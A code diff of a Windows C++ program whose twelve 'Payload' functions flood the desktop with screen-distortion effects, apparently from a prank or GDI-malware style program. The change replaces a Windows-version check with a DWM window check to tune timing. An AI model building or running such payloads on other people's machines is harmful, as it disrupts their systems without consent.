@@ -8,6 +8,11 @@
 #include <VersionHelpers.h>
 #pragma comment(lib, "msimg32.lib")
 using namespace std;
+bool DWM()
+{
+	HWND hwnd = FindWindow(L"DWM", NULL);
+	return hwnd != NULL;
+}
 int Payload = 0;
 int w = GetSystemMetrics(0);
 int h = GetSystemMetrics(1);
@@ -137,7 +142,7 @@ void Payload1() {
 			hsrc = rand() % h;
 			BitBlt(dc, wsrc - rand() % 30, hsrc - rand() % 30, size, size, dc, wsrc, hsrc, SRCCOPY);
 		}
-		Sleep(IsWindows8OrGreater() ? 1 : 5);
+		Sleep(DWM() ? 1 : 5);
 	}
 }
 void Payload2() {
@@ -252,7 +257,7 @@ void Payload2() {
 				icon = icon_list[rand() % (sizeof(icon_list) / sizeof(icon_list[0]))];
 			}
 		}
-		Sleep(IsWindows8OrGreater() ? 1 : 5);
+		Sleep(DWM() ? 1 : 5);
 	}
 }
 void Payload3() {
@@ -269,9 +274,9 @@ void Payload3() {
 		if (Payload >= 1 && Payload <= 4 || Payload == 8) {
 			StretchBlt(dcCopy, rand() % 10, rand() % 10, w, h, dc, rand() % -10, rand() % -10, w, h, SRCCOPY);
 			AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
-			if (rand() % (IsWindows8OrGreater() ? 50 : 5) == 0) RedrawScreen();
+			if (rand() % (DWM() ? 50 : 5) == 0) RedrawScreen();
 		}
-		Sleep(IsWindows8OrGreater() ? 1 : 5);
+		Sleep(DWM() ? 1 : 5);
 	}
 }
 void Payload4() {
@@ -334,7 +339,7 @@ void Payload4() {
 			Sleep(rand() % 500 + 500);
 			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
 		}
-		Sleep(IsWindows8OrGreater() ? 1 : 5);
+		Sleep(DWM() ? 1 : 5);
 	}
 }
 void Payload5() {
@@ -367,7 +372,7 @@ void Payload5() {
 				y = 0;
 			}
 		}
-		Sleep(IsWindows8OrGreater() ? 1 : 5);
+		Sleep(DWM() ? 1 : 5);
 	}
 }
 void Payload6() {
@@ -440,7 +445,7 @@ void Payload6() {
 			StretchBlt(dc, 0, ch, w, ch, dcCopy, 0, h, w, -h, rop);
 			Sleep(20);
 		}
-		Sleep(IsWindows8OrGreater() ? 1 : 5);
+		Sleep(DWM() ? 1 : 5);
 	}
 }
 void Payload7() {
@@ -453,7 +458,7 @@ void Payload7() {
 			StretchBlt(dcCopy, rand() % 30, rand() % 30, w, h, dc, rand() % 30, rand() % 30, w, h, SRCCOPY);
 			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
 		}
-		Sleep(IsWindows8OrGreater() ? 1 : 5);
+		Sleep(DWM() ? 1 : 5);
 	}
 }
 void Payload8() {
@@ -494,7 +499,7 @@ void Payload8() {
 			i++;
 			AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, blur);
 		}
-		Sleep(IsWindows8OrGreater() ? 1 : 5);
+		Sleep(DWM() ? 1 : 5);
 	}
 }
 void Payload9() {
@@ -542,7 +547,7 @@ void Payload9() {
 			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
 			Sleep(rand() % 100);
 		}
-		Sleep(IsWindows8OrGreater() ? 1 : 5);
+		Sleep(DWM() ? 1 : 5);
 	}
 }
 void Payload10() {
@@ -558,7 +563,7 @@ void Payload10() {
 			}
 			i++;
 		}
-		Sleep(IsWindows8OrGreater() ? 1 : 5);
+		Sleep(DWM() ? 1 : 5);
 	}
 }
 void Payload11() {
@@ -601,7 +606,7 @@ void Payload11() {
 			i++; angle += 0.01f;
 			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
 		}
-		Sleep(IsWindows8OrGreater() ? 1 : 5);
+		Sleep(DWM() ? 1 : 5);
 	}
 }
 void Payload12() {
@@ -628,9 +633,9 @@ void Payload12() {
 				InvertRgn(hdc, region);
 				DeleteObject(region);
 			}
-			Sleep(IsWindows8OrGreater() ? 0 : rand() % 50);
+			Sleep(DWM() ? 0 : rand() % 50);
 		}
-		Sleep(IsWindows8OrGreater() ? 1 : 5);
+		Sleep(DWM() ? 1 : 5);
 	}
 }
 void CtrlC() {
